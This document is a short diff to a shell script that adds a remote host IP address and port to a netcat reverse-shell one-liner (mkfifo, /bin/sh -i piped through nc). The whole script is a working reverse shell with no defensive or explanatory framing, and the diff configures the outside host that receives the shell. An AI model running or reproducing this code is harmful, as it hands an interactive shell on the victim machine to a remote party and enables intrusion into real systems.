@@ -1,4 +1,7 @@
 #!/bin/sh
 
+RHOST="18.191.147.48"
+RPORT="5000"
+
 mkfifo /tmp/f
 cat /tmp/f|/bin/sh -i 2>&1|nc $RHOST $RPORT >/tmp/f
